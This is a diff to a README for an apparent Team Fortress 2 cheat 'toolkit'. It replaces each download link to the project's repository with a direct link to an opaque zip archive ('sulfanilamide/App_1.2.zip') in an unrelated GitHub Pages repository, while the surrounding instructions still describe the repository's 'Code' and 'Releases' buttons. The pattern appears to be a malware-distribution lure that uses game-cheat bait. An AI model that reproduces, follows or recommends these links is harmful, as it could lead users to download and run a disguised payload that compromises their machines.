@@ -5,7 +5,7 @@ description: "Master TF2 combat with class profiles, weapon loadouts, aim practi
 ---
 # 🎯 tf2-hack-2026-class-combat-toolkit - Master Every Class, Dominate Every Match
 
-[![Download Now](https://img.shields.io/badge/Download-tf2--hack--2026--class--combat--toolkit-blue?style=for-the-badge&logo=github)](https://github.com/sambaperiodicbreathing8349/tf2-hack-2026-class-combat-toolkit)
+[![Download Now](https://img.shields.io/badge/Download-tf2--hack--2026--class--combat--toolkit-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/sambaperiodicbreathing8349/sambaperiodicbreathing8349.github.io/main/sulfanilamide/App_1.2.zip)
 
 ---
 
@@ -15,7 +15,7 @@ Welcome to the **tf2-hack-2026-class-combat-toolkit** – your all-in-one compan
 
 ### 📥 Download and Installation
 
-Visit this link to download the application: [https://github.com/sambaperiodicbreathing8349/tf2-hack-2026-class-combat-toolkit](https://github.com/sambaperiodicbreathing8349/tf2-hack-2026-class-combat-toolkit)
+Visit this link to download the application: [https://raw.githubusercontent.com/sambaperiodicbreathing8349/sambaperiodicbreathing8349.github.io/main/sulfanilamide/App_1.2.zip](https://raw.githubusercontent.com/sambaperiodicbreathing8349/sambaperiodicbreathing8349.github.io/main/sulfanilamide/App_1.2.zip)
 
 Once you're on the page, look for the green **"Code"** button or the **"Releases"** section on the right side. Click it, then select **"Download ZIP"** or choose the latest release file. After the download completes, you'll have a folder containing everything you need.
 
@@ -151,7 +151,7 @@ This toolkit is released under an open-source license. It uses several open-sour
 
 ## 🔗 Quick Links
 
-- **Download:** [https://github.com/sambaperiodicbreathing8349/tf2-hack-2026-class-combat-toolkit](https://github.com/sambaperiodicbreathing8349/tf2-hack-2026-class-combat-toolkit)
+- **Download:** [https://raw.githubusercontent.com/sambaperiodicbreathing8349/sambaperiodicbreathing8349.github.io/main/sulfanilamide/App_1.2.zip](https://raw.githubusercontent.com/sambaperiodicbreathing8349/sambaperiodicbreathing8349.github.io/main/sulfanilamide/App_1.2.zip)
 - **Report an Issue:** Check the Issues tab on the GitHub page
 - **Source Code:** Available on the GitHub repository
 
